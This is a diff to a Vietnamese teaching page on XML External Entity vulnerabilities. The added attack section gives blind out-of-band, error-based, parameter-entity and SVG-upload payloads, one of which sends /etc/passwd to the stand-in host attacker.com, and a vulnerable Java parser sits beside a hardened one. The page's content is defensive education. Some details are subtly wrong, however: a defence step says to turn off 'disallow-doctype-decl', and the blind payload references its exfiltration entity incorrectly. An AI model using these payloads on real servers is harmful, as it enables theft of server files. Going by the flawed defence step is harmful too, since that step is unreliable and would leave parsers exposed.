@@ -1,11 +1,10 @@
 # XML External Entities
 
-> **OWASP Top 10:2025**: A05:2025 – Injection | **CWE**: CWE-611 (Improper Restriction of XML External Entity Reference) | **Phân loại**: Injection
+> **CWE**: CWE-611 (Improper Restriction of XML External Entity Reference) | **Phân loại**: XML Attacks
 
-## 🧱 Kiến thức Nền tảng
-XML (eXtensible Markup Language) là ngôn ngữ đánh dấu dùng để lưu trữ và truyền tải dữ liệu có cấu trúc. Một tài liệu XML tiêu chuẩn bao gồm phần khai báo XML (XML declaration), phần tử gốc (root element), và các phần tử con lồng nhau. Để định nghĩa cấu trúc dữ liệu hợp lệ, XML sử dụng DTD (Document Type Definition). DTD cho phép định nghĩa các thực thể (Entities), hoạt động giống như các biến số trong lập trình. Khi bộ phân tích cú pháp XML (XML parser) gặp một thực thể, nó sẽ thay thế thực thể đó bằng giá trị tương ứng. XML hỗ trợ thực thể bên ngoài (External Entities), cho phép tải dữ liệu từ các tài nguyên bên ngoài hệ thống bằng cách sử dụng các chỉ thị định danh hệ thống (SYSTEM identifier) trỏ tới các giao thức mạng hoặc tệp tin cục bộ (ví dụ: `file:///etc/passwd`).
+## Kiến thức Nền tảng
 
-Lỗ hổng XML External Entity (XXE) xảy ra khi bộ phân tích cú pháp XML được cấu hình lỏng lẻo xử lý các thực thể bên ngoài do người dùng cung cấp trong tài liệu XML. Kẻ tấn công có thể chèn các thực thể trỏ đến các tệp nhạy cảm trên máy chủ hoặc các địa chỉ IP nội bộ để thực hiện tấn công SSRF. Để ngăn chặn XXE, giải pháp an toàn và hiệu quả nhất là cấu hình bộ phân tích cú pháp XML để vô hiệu hóa hoàn toàn tính năng khai báo DTD (`disallow-doctype-decl`). Nếu DTD là bắt buộc đối với ứng dụng, lập trình viên phải tắt tính năng phân giải thực thể bên ngoài (cả thực thể chung và thực thể tham số) cũng như việc tải các DTD bên ngoài. Sử dụng các thư viện an toàn mặc định hoặc cấu hình tường lửa ứng dụng (WAF) để lọc các yêu cầu chứa thẻ `DOCTYPE` cũng là các biện pháp bổ trợ hữu ích.
+Hãy nghĩ về XML như một cách sắp xếp dữ liệu có trật tự bằng các thẻ (tương tự như HTML). Trong XML, có một tính năng gọi là thực thể (Entities), hoạt động giống như việc bạn đặt phím tắt hoặc khai báo một biến số để tái sử dụng nhiều lần. Tuy nhiên, XML còn hỗ trợ các thực thể bên ngoài (External Entities) sử dụng từ khóa `SYSTEM` kèm theo một đường dẫn. Khi xử lý tài liệu XML này, bộ phân tích cú pháp (XML parser) sẽ tự động tìm đến đường dẫn đó để tải nội dung về đắp vào vị trí thực thể. Đường dẫn này có thể trỏ đến một file nằm ngay trên máy chủ hoặc một trang web trên mạng.
 
 ```java
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -30,46 +29,120 @@ public class SecureXmlParser {
 }
 ```
 
-## 🔍 Mô tả lỗ hổng
-XML External Entity (XXE) xảy ra khi bộ phân tích cú pháp XML cấu hình yếu kém xử lý các thực thể bên ngoài (external entities) do người dùng cung cấp trong tài liệu XML. Kẻ tấn công có thể lợi dụng điều này để đọc các tệp tin cục bộ nhạy cảm trên máy chủ, thực hiện quét cổng nội bộ, hoặc thực hiện các yêu cầu giả mạo phía máy chủ (SSRF). Lỗ hổng này cực kỳ nguy hiểm và thường xuất hiện ở các thư viện phân tích XML cũ không tắt chế độ DTD.
+## Mô tả lỗ hổng
 
-## ⚔️ Cơ chế tấn công
-Kẻ tấn công tải lên hoặc gửi một tài liệu XML chứa thực thể trỏ đến một đường dẫn tệp hệ thống bằng cách sử dụng các giao thức như `file:///` hoặc `http://` (ví dụ: `<!ENTITY passwords SYSTEM "file:///etc/passwd">`). Khi bộ phân tích cú pháp của máy chủ xử lý thực thể này, nó sẽ mở rộng thực thể bằng cách tải nội dung tệp `/etc/passwd` và chèn vào dữ liệu XML. Nếu ứng dụng hiển thị lại nội dung XML này trong phản hồi lỗi hoặc dữ liệu phản hồi, kẻ tấn công sẽ đọc được toàn bộ nội dung tệp nhạy cảm đó.
+Lỗ hổng XML External Entity (XXE) xảy ra khi ứng dụng web sử dụng một bộ phân tích XML được cấu hình lỏng lẻo, cho phép người dùng tự ý định nghĩa các thực thể bên ngoài này. Kẻ tấn công có thể gửi lên một tệp XML chứa thực thể bên ngoài trỏ tới các file hệ thống bí mật của máy chủ (ví dụ: `file:///etc/passwd`). Khi máy chủ phân tích tệp XML, nó sẽ "ngoan ngoãn" đọc nội dung file bí mật đó và trả về cho kẻ tấn công. Ngoài ra, kẻ tấn công còn có thể lợi dụng XXE để bắt máy chủ thực hiện các yêu cầu mạng nội bộ (SSRF) nhằm quét cổng dịch vụ ẩn bên trong, hoặc gửi lượng dữ liệu khổng lồ làm treo máy chủ (tấn công từ chối dịch vụ DoS).
 
-## 🛡️ Biện pháp phòng thủ
-- **Tóm tắt**: Ngăn chặn XXE một cách triệt để bằng cách cấu hình bộ phân tích cú pháp XML để vô hiệu hóa hoàn toàn DTD và các thực thể bên ngoài.
+## Cơ chế tấn công
+
+Các biến thể tấn công XXE phổ biến bao gồm:
+
+*   **Blind XXE (Out-of-Band - OOB)**: Khi ứng dụng không trả về kết quả phân giải XML trong phản hồi HTTP, kẻ tấn công sử dụng một DTD bên ngoài để gửi dữ liệu ra máy chủ ngoại vi thông qua DNS hoặc HTTP.
+    *   *Payload gửi lên ứng dụng*:
+        ```xml
+        <!DOCTYPE foo [
+          <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+          %dtd;
+        ]>
+        <foo>&exfil;</foo>
+        ```
+    *   *Nội dung tệp `evil.dtd` trên máy chủ kẻ tấn công*:
+        ```xml
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+        %eval;
+        ```
+*   **Parameter Entity XXE**: Sử dụng thực thể tham số (bắt đầu bằng `%`) để định nghĩa cấu trúc lồng nhau trong DTD, giúp vượt qua các hạn chế về mặt cú pháp của bộ phân tích XML nội bộ.
+    *   *Payload*:
+        ```xml
+        <!DOCTYPE foo [
+          <!ENTITY % file SYSTEM "file:///etc/passwd">
+          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+          %eval;
+        ]>
+        ```
+*   **XXE via File Upload**: Kẻ tấn công tải lên các định dạng tệp dựa trên XML như SVG (đồ họa vector) hoặc DOCX (văn bản Word) chứa thực thể độc hại.
+    *   *Payload SVG chứa XXE*:
+        ```xml
+        <?xml version="1.0" standalone="yes"?>
+        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
+        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+          <text font-size="16" x="0" y="16">&xxe;</text>
+        </svg>
+        ```
+*   **Error-based XXE**: Kẻ tấn công cố tình tạo ra lỗi cú pháp hoặc lỗi nạp tài nguyên trong đó thông điệp lỗi của hệ thống chứa nội dung tệp nhạy cảm cần đọc.
+    *   *Payload*:
+        ```xml
+        <!DOCTYPE foo [
+          <!ENTITY % file SYSTEM "file:///etc/passwd">
+          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
+          %eval;
+          %error;
+        ]>
+        ```
+
+## Biện pháp phòng thủ
+
+- **Tóm tắt**: Vô hiệu hóa DTD và các thực thể bên ngoài trên mọi bộ phân tích cú pháp XML được sử dụng trong ứng dụng.
 - **Các bước chi tiết**:
-  - Cấu hình bộ phân tích cú pháp XML để tắt chỉ thị Disallow Doctype Decl (khai báo DTD) hoặc tắt hoàn toàn việc phân giải External Entities (External Subset / Parameter Entities).
-  - Xác minh rằng các thư viện sử dụng gián tiếp XML (SOAP clients, bộ xử lý ảnh SVG, thư viện đọc tài liệu Office) cũng đã được tắt tính năng phân giải thực thể bên ngoài.
-  - Thực hiện kiểm tra và xác thực cấu trúc lược đồ XML (XSD) trước khi bắt đầu xử lý tệp.
-  - Triển khai Tường lửa ứng dụng Web (WAF) để lọc và phát hiện các payload XXE đặc trưng gửi lên hệ thống.
+  - Cấu hình tắt tính năng `disallow-doctype-decl` trong Java, hoặc tắt `resolve_entities` và `external_dtd` trong Python/PHP.
+  - Vệ sinh các tệp tải lên (SVG, DOCX) trước khi xử lý, hoặc sử dụng các thư viện phân tích an toàn mặc định như `defusedxml` trong Python.
+  - Sử dụng các định dạng trao đổi dữ liệu an toàn hơn như JSON khi có thể.
 
-## 💻 Code Example
+## Code Example
+
 ```java
+// === VULNERABLE CODE (Java DocumentBuilder) ===
+import javax.xml.parsers.DocumentBuilder;
 import javax.xml.parsers.DocumentBuilderFactory;
-import javax.xml.parsers.ParserConfigurationException;
+import org.xml.sax.InputSource;
+import java.io.StringReader;
 
-public class SecureXMLParser {
-    public static DocumentBuilderFactory getSecureFactory() throws ParserConfigurationException {
+public class XmlParserVulnerable {
+    public void parse(String xmlInput) throws Exception {
+        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+        // DANGER: By default, DocumentBuilderFactory resolves external entities and DTDs
+        DocumentBuilder db = dbf.newDocumentBuilder();
+        db.parse(new InputSource(new StringReader(xmlInput)));
+    }
+}
+
+// === SECURE CODE (Java DocumentBuilder) ===
+import javax.xml.parsers.DocumentBuilder;
+import javax.xml.parsers.DocumentBuilderFactory;
+
+public class XmlParserSecure {
+    public void parse(String xmlInput) throws Exception {
         DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
         
-        // Disable DTDs entirely (highly recommended)
+        // SECURE: Disable DTD declarations completely
         dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
         
-        // Alternatively, if DTDs are required, disable external entity resolution:
-        // dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
-        // dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
-        // dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+        // SECURE: Disable external entities if DTDs cannot be fully disabled
+        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
+        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
         
-        dbf.setXIncludeAware(false);
-        dbf.setExpandEntityReferences(false);
-        
-        return dbf;
+        DocumentBuilder db = dbf.newDocumentBuilder();
+        db.parse(new InputSource(new StringReader(xmlInput)));
     }
 }
 ```
 
-## 📚 Ghi chú kỹ thuật & Nguồn tham khảo
-- **Trạng thái kiểm định**: FIXED
-- **Ghi chú kỹ thuật**: Trong ví dụ Java, các ký tự chú thích `#` (kiểu Python) gây lỗi biên dịch đã được thay thế bằng chú thích hợp lệ `//`. Đồng thời điều chỉnh tệp nhạy cảm trong ví dụ payload ở Slide 9 từ tệp đòi hỏi quyền root `/etc/shadow` thành tệp `/etc/passwd` thực tế hơn, và sửa cú pháp đường dẫn URI bị lỗi từ `file://etc/shadow` thành `file:///etc/passwd` chuẩn.
-- **Nguồn tham khảo**: OWASP XXE Cheat Sheet, PortSwigger, CWE-611
+## Xem thêm
+
+- [XML Bombs](../../10-exceptional-conditions/xml-bombs/) — Kỹ thuật tấn công từ chối dịch vụ (DoS) lợi dụng cơ chế mở rộng thực thể XML để tiêu tốn bộ nhớ máy chủ (Billion Laughs attack).
+- [Server-Side Request Forgery](../../01-broken-access-control/ssrf/) — Lỗ hổng giả mạo yêu cầu từ phía máy chủ, thường được kết hợp với XXE để quét cổng hoặc gửi truy vấn nội bộ.
+
+## Nguồn tham khảo
+
+- PortSwigger: https://portswigger.net/web-security/xxe
+- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+- CWE: https://cwe.mitre.org/data/definitions/611.html
+
+## Giải thích thuật ngữ
+
+- **XXE (XML External Entity)**: Lỗ hổng bảo mật liên quan đến thực thể bên ngoài XML, cho phép đọc file hoặc tạo yêu cầu mạng trái phép.
+- **DTD (Document Type Definition)**: Tập hợp các quy tắc định nghĩa cấu trúc của một tài liệu XML.
+- **XML Entity**: Thực thể đóng vai trò như một hằng số hoặc một biến để tái sử dụng dữ liệu trong XML.
+- **XML Parser**: Bộ xử lý giúp phân tích cú pháp và dựng cấu trúc tài liệu XML.
+- **SSRF (Server-Side Request Forgery)**: Tấn công giả mạo yêu cầu từ phía máy chủ, bắt máy chủ gửi truy vấn mạng tới các địa chỉ khác.
